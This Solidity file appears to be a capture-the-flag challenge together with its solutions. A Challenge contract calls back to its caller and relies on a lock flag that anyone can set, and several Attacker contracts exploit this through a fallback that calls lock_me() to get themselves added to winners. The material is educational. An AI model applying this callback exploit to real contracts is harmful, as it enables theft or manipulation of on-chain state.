// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

// The goal of this challenge is to be able to sign offchain a message
// with an address stored in winners.
contract Challenge{

    address[] public winners;
    bool public lock;

    function exploit_me(address winner) public{
        lock = false;

        msg.sender.call("");

        require(lock, "Not Lock!");
        winners.push(winner);
    }

    function lock_me() public{
        lock = true;
    }
}

////// Best ///////

// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

interface IChallenge{
    function exploit_me(address winner) external;
    function lock_me() external;
}

contract Attacker {
    address public winner;
    IChallenge public challenge;

    constructor(address _challenge) {
        challenge = IChallenge(_challenge);
        winner = msg.sender;
    }

    function attack() public {
        challenge.exploit_me(winner);
    }

    fallback() external {
        challenge.lock_me();
    }
}


contract Attacker {
    address public challenge;
    address public winner;

    constructor(address _challenge) {
        challenge = _challenge;
        winner = msg.sender;
    }

    event AddWinnder(address _winner);
    event Unlock(string lock);
    event Start(string start, address exploiter);

    function attack(address _winner) public {
        bytes4 sel = Challenge(challenge).exploit_me.selector;
        (bool success,) = challenge.call(abi.encodeWithSelector(sel, _winner));
    }

    function attackLock_me() public {
        bytes4 selLock = Challenge(challenge).lock_me.selector;
        (bool success,) = challenge.call(abi.encodeWithSelector(selLock));
    }

    fallback() external {
        emit Start("Start exploit!", msg.sender);
        attackLock_me();
    }
}




//////////////////
// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

// The goal of this challenge is to be able to sign offchain a message
// with an address stored in winners.
contract IChallenge{
    function exploit_me(address winner) public{}
    function lock_me() public{}
}


contract Attacker {
    address public challenge;
    address public winner;

    constructor(address _challenge) {
        challenge = _challenge;
        winner = msg.sender;
    }

    event AddWinnder(address _winner);
    event Unlock(string lock);
    event Start(string start, address exploiter);

    function attack(address _winner) public {
        bytes4 sel = IChallenge(challenge).exploit_me.selector;
        (bool success,) = challenge.call(abi.encodeWithSelector(sel, _winner));
    }

    function attackLock_me() public {
        bytes4 selLock = IChallenge(challenge).lock_me.selector;
        (bool success,) = challenge.call(abi.encodeWithSelector(selLock));
    }

    fallback() external {
        emit Start("Start exploit!", msg.sender);
        attackLock_me();
    }
}

